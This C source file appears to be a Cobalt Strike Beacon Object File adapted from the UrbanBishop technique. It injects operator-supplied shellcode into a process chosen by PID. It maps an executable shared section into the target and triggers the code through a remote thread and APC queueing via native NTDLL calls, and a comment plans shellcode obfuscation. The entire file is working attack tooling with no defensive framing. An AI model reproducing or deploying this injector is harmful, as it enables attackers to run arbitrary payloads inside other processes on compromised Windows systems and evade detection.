// inject_urbanbishop.c
// adapted from https://github.com/FuzzySecurity/Sharp-Suite/tree/master/UrbanBishop

#include <windows.h>
#include "beacon.h"

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef VOID(KNORMAL_ROUTINE) (
    PVOID NormalContext,
    PVOID SystemArgument1,
    PVOID SystemArgument2);

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef KNORMAL_ROUTINE* PKNORMAL_ROUTINE;

typedef enum _SECTION_INHERIT
    {
        ViewShare = 1,
        ViewUnmap = 2
    } SECTION_INHERIT, *PSECTION_INHERIT;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

//DECLSPEC_IMPORT void NTDLL$memcpy(void* Destination, const void* Source, size_t Length);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtAlertResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount OPTIONAL);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateSection(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    PLARGE_INTEGER MaximumSize OPTIONAL,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle OPTIONAL);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument OPTIONAL,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset OPTIONAL,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQueueApcThread(
    HANDLE ThreadHandle,
    PKNORMAL_ROUTINE ApcRoutine,
    PVOID ApcArgument1 OPTIONAL,
    PVOID ApcArgument2 OPTIONAL,
    PVOID ApcArgument3 OPTIONAL);

DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$RtlGetVersion(PRTL_OSVERSIONINFOW);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess (VOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess (
    DWORD dwDesiredAccess,
    WINBOOL bInheritHandle,
    DWORD dwProcessId);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void mycopy(char * dst, char * src, int size) {
    int x;
    for (x = 0; x < size; x++) {
        *dst = *src;
        dst++;
        src++;
    }
}

void inject(char* args, int length) {

    // Parse arguments
    datap parser;
    int pid, sc_len;
    char* sc;
    BeaconDataParse(&parser, args, length);
    pid = BeaconDataInt(&parser);
    sc = BeaconDataExtract(&parser, &sc_len);
    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to inject beacon into pid %u", pid);

    // Create section
    HANDLE hSection;
    SIZE_T size = 409600;
    LARGE_INTEGER maxSize = { size };
    NTSTATUS status;
    status = NTDLL$NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,
        &maxSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create section");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Created section");

    // Map section to local process
    PVOID localBaseAddress = NULL;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        KERNEL32$GetCurrentProcess(),
        &localBaseAddress,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (PLARGE_INTEGER)NULL,
        &size,
        0x2,
        (ULONG_PTR)NULL,
        PAGE_READWRITE);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to map to local process");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Mapped local process");

    // Map section to target process
    HANDLE hTargetProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    PVOID remoteBaseAddress = NULL;
    status = NTDLL$NtMapViewOfSection(
        hSection,
        hTargetProcess,
        &remoteBaseAddress,
        (ULONG_PTR)NULL,
        (ULONG_PTR)NULL,
        (PLARGE_INTEGER)NULL,
        &size,
        0x2,
        (ULONG_PTR)NULL,
        PAGE_EXECUTE_READ);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to map to remote process");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Mapped remote process");

    // Write shellcode into shared section
    // TODO: Obfuscate shellcode
    mycopy(localBaseAddress, sc, sc_len);
    //BeaconPrintf(CALLBACK_OUTPUT, "Copied sc");

    // Trigger execution in target process using APC queue
    HANDLE hTargetThread;
    status = NTDLL$NtCreateThreadEx(
        &hTargetThread,
        0x1fffff,
        NULL,
        hTargetProcess,
        remoteBaseAddress,
        NULL,
        TRUE,
        0,
        0Xffff,
        0Xffff,
        NULL);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create remote thread");
        return;
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Created remote thread");

    status = NTDLL$NtQueueApcThread(
        hTargetThread,
        remoteBaseAddress,
        0, 0, 0);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to queue apc");
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Queued APC thread");

    PULONG pSuspendCount = 0;
    status = NTDLL$NtAlertResumeThread(hTargetThread, pSuspendCount);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resume thread");
    }
    //BeaconPrintf(CALLBACK_OUTPUT, "Resumed thread");

    // Cleanup
    KERNEL32$CloseHandle(hTargetThread);
    KERNEL32$CloseHandle(hTargetProcess);
    KERNEL32$CloseHandle(hSection);
    BeaconPrintf(CALLBACK_OUTPUT, "Completed");
}
